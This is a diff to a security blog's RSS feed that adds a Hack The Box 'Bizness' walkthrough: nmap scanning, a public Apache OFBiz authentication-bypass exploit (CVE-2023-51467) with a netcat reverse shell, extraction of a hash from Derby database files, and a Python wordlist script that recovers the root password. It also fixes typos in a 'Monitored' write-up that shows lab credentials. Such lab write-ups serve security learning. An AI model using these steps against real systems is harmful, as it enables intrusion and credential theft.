@@ -6,8 +6,170 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 09 May 2024 21:41:07 -0500</lastBuildDate>
+        <lastBuildDate>Wed, 22 May 2024 21:18:09 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB Bizness</title>
+            <link>https://scorpiosec.com/posts/2024/05/htb-bizness/</link>
+            <pubDate>Wed, 22 May 2024 21:18:09 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/05/htb-bizness/</guid>
+            <description>Platform: Hack The Box Link: Bizness Level: Easy OS: Linux Bizness is showcasing a web application powered by Apache OFBiz. During our investigation of vulnerabilities in the software, we identify one that allows attackers to bypass authentication. Leveraging this exploit, we gain our initial foothold. Next, we stumble upon a directory for Apache Derby that containing numerous .dat files. Our task is to sift through these files. Using some command-line magic, we manage to retrieve a password hash.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Bizness" target="_blank" >Bizness</a>
+
+</li>
+<li>Level: Easy</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Bizness is showcasing a web application powered by Apache OFBiz. During our investigation of vulnerabilities in the software, we identify one that allows attackers to bypass authentication. Leveraging this exploit, we gain our initial foothold. Next, we stumble upon a directory for Apache Derby that containing numerous .dat files. Our task is to sift through these files. Using some command-line magic, we manage to retrieve a password hash. Unfortunately, common cracking methods fail to break it. To escalate our privileges to root, we switch tactics. We create a script that encrypts each line of a wordlist and compare the resulting hashes to the one we have. Once we find a match, the root password is revealed.</p>
+<p>Target IP - <code>10.10.11.252</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Bizness 10.10.11.252
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Nmap 7.94SVN scan initiated Mon Mar  <span style="color:#ae81ff">4</span> 14:20:48 <span style="color:#ae81ff">2024</span> as: nmap -sC -sV -oA nmap/Bizness 10.10.11.252
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.252
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.046s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://bizness.htb/
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>UK
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-12-14T20:03:40
+</span></span><span style="display:flex;"><span>|_Not valid after:  2328-11-10T20:03:40
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://bizness.htb/
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span> at Mon Mar  <span style="color:#ae81ff">4</span> 14:21:07 <span style="color:#ae81ff">2024</span> -- <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.37 seconds
+</span></span></code></pre></div><p>Our scan discovers three open ports:</p>
+<ul>
+<li>Port 22/tcp: running SSH (Secure Shell) service.</li>
+<li>Port 80/tcp: running HTTP service with nginx 1.18.0.</li>
+<li>Port 443/tcp: running SSL/HTTP (HTTPS) service with nginx 1.18.0.</li>
+</ul>
+<p>We also have a redirection to <code>bizness.htb</code>, which we add to our <code>/etc/hosts</code> file with <code>sudo echo &quot;10.10.11.252 bizness.htb&quot; | sudo tee -a /etc/hosts</code>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>At <code>https://bizness.htb/</code> we find a website for a company providing different business services.</p>
+<p><img src="/images/HTB-Bizness/bizness-website.png" alt="Bizness website"></p>
+<p>At the end of the page we notice that the website is powered by <code>Apache OFBiz</code>.</p>
+<p><img src="/images/HTB-Bizness/pwrd-Apache-OFBiz.png" alt="Footer info showing Apache OFBiz used"></p>
+<p>The website doesn&rsquo;t offer any additional useful information so we move to directory bruteforcing.</p>
+<p><img src="/images/HTB-Bizness/dirsearch1.png" alt="Dirsearch results"></p>
+<p><img src="/images/HTB-Bizness/dirsearch2.png" alt="More dirsearch results"></p>
+<p>We check <code>/control</code> and it is showing an error message.</p>
+<p><img src="/images/HTB-Bizness/apache-OFBiz.png" alt="Apache OFBiz error message"></p>
+<blockquote>
+<p>Apache OFBiz is an open source enterprise resource planning system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.</p>
+</blockquote>
+<p>We then go to <code>/control/login</code> and I find a login page.</p>
+<p><img src="/images/HTB-Bizness/apacheOFBiz-login.png" alt="Apache OFBiz login page"></p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>We don&rsquo;t have any credentials right now so we research <code>Apache OFBiz vulnerability</code> and find <code>CVE-2023-51467</code>.</p>
+<p><img src="/images/HTB-Bizness/CVE-2023-51467.png" alt="CVE-2023-51467"></p>
+<p>An exploit is available at this <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master" target="_blank" >Github account</a>
+
+. I verify that the target is indeed vulnerable wit the <code>xdetection</code> script.</p>
+<p><img src="/images/HTB-Bizness/ApacheOFBiz-vulnerable.png" alt="CVE-2023-51467 test"></p>
+<p>We setup a netcat listener and run the exploit script.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p><img src="/images/HTB-Bizness/exploit-script-ApacheOFBiz.png" alt="Apache OFBiz exploitation"></p>
+<p>On the listener we get a reverse shell!</p>
+<p><img src="/images/HTB-Bizness/reverse-shell.png" alt="Reverse shell"></p>
+<p>We can upgrade our shell.</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+</code></pre><p><img src="/images/HTB-Bizness/better-shell.png" alt="Reverse shell"></p>
+<p>The user flag is found at <code>/home/ofbiz/user.txt</code>.</p>
+<p><img src="/images/HTB-Bizness/user-flag.png" alt="User flag"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>After exploring the system we find a password hash at <code>/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml</code> but we are unable to crack it.</p>
+<p>After more digging we find a directory called <code>derby</code>.</p>
+<blockquote>
+<p>Apache Derby is a relational database management system developed by the Apache Software Foundation that can be embedded in Java programs and used for online transaction processing.</p>
+</blockquote>
+<p>A file called <code>README_DO_NOT_TOUCH_FILES.txt</code> at <code>/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code> confirmis that this is indeed the database folder.</p>
+<p><img src="/images/HTB-Bizness/derby-db.png" alt="Apache derby database file"></p>
+<p>The <code>seg0</code> directory contains a lot of <code>.dat</code> files.</p>
+<p><img src="/images/HTB-Bizness/dat-files.png" alt=".dat files list"></p>
+<p>To make searching through the content easier we put all the content into a single <code>.txt</code> file that I transfer on my local machine.</p>
+<pre tabindex="0"><code>cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* &gt; dat_files.txt
+</code></pre><p>On our local machine we search through all of the <code>.dat</code> files with</p>
+<pre tabindex="0"><code>strings dat_files.txt | grep SHA
+</code></pre><p>A hash is found.</p>
+<p><img src="/images/HTB-Bizness/hash1.png" alt="hash found"></p>
+<pre tabindex="0"><code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+</code></pre><p>In the same file we find a line with <code>admin</code> as the username hinting that this is the admin password hash. But we are unable to crack this one also. Currently we have two hashes but no way to crack them.</p>
+<p><img src="/images/HTB-Bizness/login-admin.png" alt="admin username"></p>
+<p>We can go another route, by encrypting each line of the <code>rockyou.txt</code> wordlist and comparing it to the last hash I found. The match will reveal the password.</p>
+<blockquote>
+<p>You can check the <a href="https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java" target="_blank" >source code</a>
+
+ of Apache OFBiz to see how the hashes are generated.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PasswordEncryptor</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, hash_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA&#34;</span>, pbkdf2_iterations<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>hash_type <span style="color:#f92672">=</span> hash_type
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pbkdf2_iterations <span style="color:#f92672">=</span> pbkdf2_iterations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">crypt_bytes</span>(self, salt, value):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> salt:
+</span></span><span style="display:flex;"><span>            salt <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>        hash_obj <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(self<span style="color:#f92672">.</span>hash_type)
+</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(salt<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>        hash_obj<span style="color:#f92672">.</span>update(value)
+</span></span><span style="display:flex;"><span>        hashed_bytes <span style="color:#f92672">=</span> hash_obj<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;$</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>hash_type<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>salt<span style="color:#e6db74">}</span><span style="color:#e6db74">$</span><span style="color:#e6db74">{</span>base64<span style="color:#f92672">.</span>urlsafe_b64encode(hashed_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Example usage:</span>
+</span></span><span style="display:flex;"><span>hash_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SHA1&#34;</span>
+</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d&#34;</span>
+</span></span><span style="display:flex;"><span>search <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#34;</span>
+</span></span><span style="display:flex;"><span>wordlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create an instance of the PasswordEncryptor class</span>
+</span></span><span style="display:flex;"><span>encryptor <span style="color:#f92672">=</span> PasswordEncryptor(hash_type)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Iterate through the wordlist and check for a matching password</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(wordlist, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;latin-1&#39;</span>) <span style="color:#66d9ef">as</span> password_list:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> password_list:
+</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> encryptor<span style="color:#f92672">.</span>crypt_bytes(salt, value<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hashed_password <span style="color:#f92672">==</span> search:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Password found: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">, hash: </span><span style="color:#e6db74">{</span>hashed_password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>After running the script we find the password to be <code>monkeybizness</code>.</p>
+<p><img src="/images/HTB-Bizness/pwd-find.png" alt="Password finder with Python"></p>
+<p>We use it to login as root on the target machine with <code>su root</code>.</p>
+<p><img src="/images/HTB-Bizness/root-login.png" alt="root login"></p>
+<p>The root flag is found at <code>/root/root.txt</code>.</p>
+<p><img src="/images/HTB-Bizness/root-flag.png" alt="root flag"></p>
+<p>I am not sure I would have made this an &ldquo;Easy&rdquo; machine but I enjoyed this challenge a lot because it helped me polish my scripting and problem solving skills.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Monitored</title>
@@ -145,7 +307,7 @@
 <p>The command below creates a lot of output on the terminal so I sent it to a file.</p>
 </blockquote>
 <pre tabindex="0"><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
-</code></pre><p>Going over the output I find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
+</code></pre><p>Going over the output we find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
 <p><img src="/images/HTB-Monitored/creds-snmp.png" alt="SNMP potential credentials"></p>
 <p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
 <p><img src="/images/HTB-Monitored/nagiosxi-login-attempt.png" alt="NagiosXI login attempt failed"></p>
@@ -202,9 +364,9 @@
 <p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p>
 <p><img src="/images/HTB-Monitored/apply-config.png" alt="Apply configuration"></p>
 <p>Let&rsquo;s start a listener on the port specified in our command.</p>
-<p>To run the command Go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
+<p>To run the command go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
 <p><img src="/images/HTB-Monitored/localhost.png" alt="Configuration - localhost"></p>
-<p>Under <code>Check command</code>, select your command and click <code>Run Check Commad</code> and you will get a connection on your listener.</p>
+<p>Under <code>Check command</code>, select your command and click <code>Run Check Command</code> and you will get a connection on your listener.</p>
 <p><img src="/images/HTB-Monitored/nagios-shell.png" alt="Initial Foothold"></p>
 <p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p>
 <p><img src="/images/HTB-Monitored/user-flag.png" alt="User flag"></p>
